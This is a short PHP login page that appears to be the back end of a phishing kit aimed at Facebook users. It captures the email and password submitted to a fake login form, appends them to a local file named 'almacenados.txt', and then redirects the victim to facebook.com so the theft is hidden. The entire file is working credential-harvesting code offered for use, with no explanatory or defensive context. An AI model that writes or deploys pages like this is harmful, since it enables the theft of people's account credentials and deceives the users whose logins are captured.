<html> 
<head> 
<title> Login </title> 
</head> 
<body> 
<? 
$login=htmlentities($_POST['email']); 
$pass=htmlentities($_POST['pass']); 
$guardame=fopen("almacenados.txt", a); 
fwrite ($guardame," 
".$login." 
".$pass); 
Fclose($guardame) 
?> 
<META HTTP-EQUIV='refresh' CONTENT='1;url=http://facebook.com'> 
</body> 
</html> 